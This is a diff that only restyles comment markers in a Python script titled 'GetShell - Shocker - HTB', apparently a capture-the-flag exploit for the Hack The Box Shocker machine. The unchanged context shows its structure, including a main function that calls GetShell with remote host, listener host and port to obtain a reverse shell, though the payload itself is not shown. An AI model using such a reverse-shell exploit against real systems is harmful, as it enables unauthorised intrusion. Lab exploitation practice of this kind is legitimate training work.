@@ -1,10 +1,10 @@
 #! /usr/bin/env python3
 
-## Author: 0xEtern4lW0lf
-## Created: 18 Dez 2022
-## Description: GetShell - Shocker - HTB
+#### Author: 0xEtern4lW0lf
+#### Created: 18 Dez 2022
+#### Description: GetShell - Shocker - HTB
 
-## ========= MODULES =========
+#### ========= MODULES =========
 
 import argparse
 import requests
@@ -12,7 +12,7 @@ import socket
 import telnetlib
 from threading import Thread
 
-## ========= VARIABLE =========
+#### ========= VARIABLE =========
 
 #### COLORS ####
 RED = "\033[1;91m"
@@ -24,7 +24,7 @@ END = "\033[1;m "
 ## Set proxy [OPTIONAL]
 #proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
-## ========= FUNCTION =========
+#### ========= FUNCTION =========
 
 ## Banner
 def banner():
@@ -114,7 +114,7 @@ def main():
     ## Get the reverse shell
     GetShell(rhost,lhost,lport)
 
-## ======= EXECUTION =======
+#### ======= EXECUTION =======
 
 if __name__ == '__main__':
     banner()
